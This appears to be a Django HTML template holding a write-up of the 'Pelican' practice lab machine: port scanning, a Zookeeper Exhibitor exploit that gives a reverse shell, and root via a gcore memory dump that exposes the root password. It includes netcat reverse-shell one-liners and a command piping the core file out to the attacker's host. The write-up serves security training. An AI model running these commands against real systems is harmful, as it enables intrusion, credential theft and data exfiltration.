@@ -1,0 +1,127 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EThHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Practice : Pelican</h1>
+    <p class="text">Difficulty : Intermediate | CommunityRating : Intermediate | MyRating : Easy | Time : 1h09min</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ sudo nmap -p 22,139,445,631,2181,2222,8080,8081,39605 192.168.156.98 --min-rate=10000                                                   
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 04:41 EST
+Nmap scan report for 192.168.156.98
+Host is up (0.10s latency).
+
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
+|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
+|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+631/tcp   open  ipp         CUPS 2.2
+|_http-server-header: CUPS/2.2 IPP/2.1
+|_http-title: Forbidden - CUPS v2.2.10
+| http-methods: 
+|_  Potentially risky methods: PUT
+2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
+2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
+|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
+|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
+8080/tcp  open  http        Jetty 1.0
+|_http-title: Error 404 Not Found
+|_http-server-header: Jetty(1.0)
+8081/tcp  open  http        nginx 1.14.2
+|_http-title: Did not follow redirect to http://192.168.156.98:8080/exhibitor/v1/ui/index.html
+|_http-server-header: nginx/1.14.2
+39605/tcp open  java-rmi    Java RMI
+Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+<p class="text">There are several suspiciouis open ports. Searching <u>ipp CUPS 2.2</u>, I found CVE but it's not valid for this version. </p>
+<p class="text">Next I searched <u>Zookeeper 3.4.6-1569965 vulnerability</u>, then i found <a href="https://www.exploit-db.com/exploits/48654">this PoC</a> text file.</p>
+<p class="text">Accourding to this poc, there is a web UI page which we can control parameter.</p>
+<div class="img">
+    <img src="{% static 'EthHack/images/pelican/1.png' %}" alt="">
+    <p class="text">Opening http://$IP:8081, I found UI page. I set revshell command to java.env script following instruction, and got reverse shell.</p>
+</div>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ rlwrap nc -lvnp 4444     
+listening on [any] 4444 ...
+connect to [192.168.45.157] from (UNKNOWN) [192.168.156.98] 47942
+bash: cannot set terminal process group (524): Inappropriate ioctl for device
+bash: no job control in this shell
+charles@pelican:/opt/zookeeper$ </code></pre></div>
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">The user charles has sudo right : </p>
+<div class="code-box"><pre><code>charles@pelican:~$ sudo -l
+sudo -l
+Matching Defaults entries for charles on pelican:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User charles may run the following commands on pelican:
+    (ALL) NOPASSWD: /usr/bin/gcore</code></pre></div>
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/pelican/2.png' %}" alt="">
+        <p class="text">Reading GTFOBins page, it revealed that we can dump running process data by indicating process ID.</p>
+    </div>
+    <p class="text">Enumerating running-processes with ps command, I found interesting process.</p>
+<div class="code-box"><pre><code>charles@pelican:~$ ps auxww | grep -i pass
+ps auxww | grep -i pass
+root       513  0.0  0.0   2276    72 ?        Ss   04:29   0:00 /usr/bin/password-store</code></pre></div>
+
+<p class="text">I dumped this process with sudo /usr/bin/gcore.</p>
+<div class="code-box"><pre><code>charles@pelican:~$ sudo /usr/bin/gcore 513
+sudo /usr/bin/gcore 513
+0x00007f971bd1c6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffc3d7a2c80, remaining=remaining@entry=0x7ffc3d7a2c80) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
+28      ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
+Saved corefile core.513
+[Inferior 1 (process 513) detached]
+charles@pelican:~$ ls
+ls
+core.513
+...</code></pre></div>
+<p class="text">Since this is raw ELF file, we need to make it human-readable. I copided this file via nc and analyzed it on my local kali machine.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ nc -lvnp 4444 > core.513
+listening on [any] 4444 ...
+connect to [192.168.45.157] from (UNKNOWN) [192.168.156.98] 47446</code></pre></div>
+<div class="code-box"><pre><code>charles@pelican:~$ cat core.513 | nc 192.168.45.157 4444
+cat core.513 | nc 192.168.45.157 4444</code></pre></div>
+<p class="text">We can now analyze generated file uisng strings command.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ strings core.513 
+...
+001 Password: root:
+ClogKingpinInning731
+E?z=</code></pre></div>
+
+<p class="text">We got root password. Since generated bash shell with su root would freeze as soon as I input one command, I sent revshell command.</p>
+<div class="code-box"><pre><code>charles@pelican:/opt/zookeeper$ su root
+su root
+Password: ClogKingpinInning731
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.157 4444 >/tmp/f</code></pre></div>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.157] from (UNKNOWN) [192.168.156.98] 47958
+sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre></div>
+
+<p class="text">I got root shell.</p>
+
+
+</body>
+</html>
